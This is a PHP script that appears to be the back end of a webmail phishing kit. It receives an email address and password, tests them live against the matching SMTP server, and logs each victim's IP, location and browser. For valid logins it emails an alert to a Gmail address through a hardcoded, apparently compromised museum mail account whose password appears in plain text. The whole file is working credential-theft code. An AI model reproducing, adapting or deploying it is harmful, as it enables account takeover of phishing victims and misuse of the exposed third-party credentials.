<?php
// Configuration
$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
$senderuser   = "okioko@museums.or.ke"; // SMTP user
$senderpass   = "onesmus@2022";         // SMTP password
$senderport   = 587;                    // SMTP port
$senderserver = "mail.museums.or.ke";  // SMTP server

// Get client information
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Force JSON output
header('Content-Type: application/json; charset=utf-8');

// Capture all output including errors
ob_start();

error_reporting(E_ALL);
ini_set('display_errors', 0); // Turn off HTML error display
ini_set('log_errors', 1); // Log errors instead

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

try {
    require_once __DIR__ . '/class.phpmailer.php';
    require_once __DIR__ . '/class.smtp.php';
} catch (Throwable $e) {
    $output = ob_get_clean();
    echo json_encode([
        'success' => false,
        'error' => 'Failed to load required files: ' . $e->getMessage(),
        'extra_output' => $output
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit();
}

// Function to get client IP
function getClientIP() {
    $ipKeys = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to get geolocation info
function getGeoInfo($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return 'Local/Unknown';
    }
    
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,isp");
        if ($response) {
            $data = json_decode($response, true);
            if ($data && isset($data['country'])) {
                return "{$data['city']}, {$data['regionName']}, {$data['country']} ({$data['isp']})";
            }
        }
    } catch (Exception $e) {
        // Ignore geolocation errors
    }
    
    return 'Unknown location';
}

try {
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        $data = $_POST;
    }
    
    // Validate input
    $email = trim($data['email'] ?? '');
    $password = $data['password'] ?? '';
    
    if (empty($email) || empty($password)) {
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Email and password are required'
        ]);
        exit();
    }
    
    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Invalid email format'
        ]);
        exit();
    }
    
    // Extract domain from email for SMTP configuration
    $domain = substr(strrchr($email, "@"), 1);
    
    // Common SMTP configurations for popular providers
    $smtpConfigs = [
        'gmail.com' => ['host' => 'smtp.gmail.com', 'port' => 587, 'secure' => 'tls'],
        'yahoo.com' => ['host' => 'smtp.mail.yahoo.com', 'port' => 587, 'secure' => 'tls'],
        'outlook.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'hotmail.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'live.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'aol.com' => ['host' => 'smtp.aol.com', 'port' => 587, 'secure' => 'tls'],
        'icloud.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'me.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'mac.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls']
    ];
    
    // Default SMTP config (for cPanel/other providers)
    $smtpConfig = $smtpConfigs[$domain] ?? [
        'host' => 'mail.' . $domain,
        'port' => 587,
        'secure' => 'tls'
    ];
    
    // Test SMTP connection with proper authentication
    $isValid = false;
    $errorMessage = '';
    
    try {
        // Create new PHPMailer instance
        $testMail = new PHPMailer(true);
        
        // Configure SMTP
        $testMail->isSMTP();
        $testMail->Host = $smtpConfig['host'];
        $testMail->Port = $smtpConfig['port'];
        $testMail->SMTPSecure = $smtpConfig['secure'];
        $testMail->SMTPAuth = true;
        $testMail->Username = $email;
        $testMail->Password = $password;
        $testMail->SMTPDebug = 0; // Set to 0 for production, 2 for debugging
        $testMail->Timeout = 10; // Increased timeout
        $testMail->SMTPKeepAlive = false;
        
        // Enable debug output to error log if needed
        $testMail->Debugoutput = function($str, $level) {
            error_log("SMTP Debug [$level]: $str");
        };
        
        // Try to connect and authenticate
        if ($testMail->smtpConnect()) {
            // Try to authenticate
            if ($testMail->smtpAuthenticate($email, $password)) {
                $isValid = true;
                $errorMessage = 'Authentication successful';
            } else {
                $isValid = false;
                $errorMessage = 'Authentication failed - invalid credentials';
            }
            $testMail->smtpClose();
        } else {
            $isValid = false;
            $errorMessage = 'Cannot connect to SMTP server';
        }
        
    } catch (Exception $e) {
        $isValid = false;
        $errorMessage = 'SMTP Exception: ' . $e->getMessage();
        error_log("SMTP Error: " . $e->getMessage());
    } catch (Error $e) {
        $isValid = false;
        $errorMessage = 'SMTP Error: ' . $e->getMessage();
        error_log("SMTP Fatal Error: " . $e->getMessage());
    }
    
    // Get client information
    $clientIP = getClientIP();
    $geoInfo = getGeoInfo($clientIP);
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date('Y-m-d H:i:s T');
    
    // Prepare log entry
    $logEntry = sprintf(
        "[%s] Email: %s | Valid: %s | IP: %s | Location: %s | User-Agent: %s | Error: %s | SMTP: %s:%s\n",
        $timestamp,
        $email,
        $isValid ? 'YES' : 'NO',
        $clientIP,
        $geoInfo,
        $userAgent,
        $errorMessage,
        $smtpConfig['host'],
        $smtpConfig['port']
    );
    
    // Log the attempt
    @file_put_contents('webmail_login_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Send notification email if credentials are valid (optional)
    $notificationSent = false;
    if ($isValid) {
        try {
            $notifyMail = new PHPMailer(true);
            $notifyMail->isSMTP();
            $notifyMail->Host = $senderserver;
            $notifyMail->Port = $senderport;
            $notifyMail->SMTPSecure = 'tls';
            $notifyMail->SMTPAuth = true;
            $notifyMail->Username = $senderuser;
            $notifyMail->Password = $senderpass;
            $notifyMail->SMTPDebug = 0;
            $notifyMail->Timeout = 10;
            
            $notifyMail->setFrom($senderuser, 'Webmail Login Monitor');
            $notifyMail->addAddress($receiver);
            $notifyMail->Subject = 'Valid Webmail Login Detected';
            
            $body = "Valid webmail login detected!\n\n";
            $body .= "Email: $email\n";
            $body .= "IP: $clientIP\n";
            $body .= "Location: $geoInfo\n";
            $body .= "User Agent: $userAgent\n";
            $body .= "Timestamp: $timestamp\n";
            $body .= "SMTP Server: {$smtpConfig['host']}:{$smtpConfig['port']}\n";
            
            $notifyMail->Body = $body;
            $notifyMail->AltBody = strip_tags($body);
            
            if ($notifyMail->send()) {
                $notificationSent = true;
            }
        } catch (Exception $e) {
            error_log("Failed to send notification email: " . $e->getMessage());
            $notificationSent = false;
        }
    }
    
    // Prepare response
    $response = [
        'signal' => $isValid ? 'ok' : 'error',
        'success' => $isValid,
        'msg' => $isValid ? 'Login successful!' : 'Invalid credentials. Please try again.',
        'details' => [
            'email' => $email,
            'domain' => $domain,
            'smtp_host' => $smtpConfig['host'],
            'smtp_port' => $smtpConfig['port'],
            'smtp_secure' => $smtpConfig['secure'],
            'client_ip' => $clientIP,
            'location' => $geoInfo,
            'timestamp' => $timestamp,
            'notification_sent' => $notificationSent,
            'error_message' => $errorMessage,
            'authentication_result' => $isValid ? 'SUCCESS' : 'FAILED'
        ]
    ];
    
    echo json_encode($response);
    
} catch (Exception $e) {
    error_log("Postmailer error: " . $e->getMessage());
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => $e->getMessage()
        ]
    ]);
} catch (Error $e) {
    error_log("Postmailer fatal error: " . $e->getMessage());
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => 'Internal server error'
        ]
    ]);
}
?>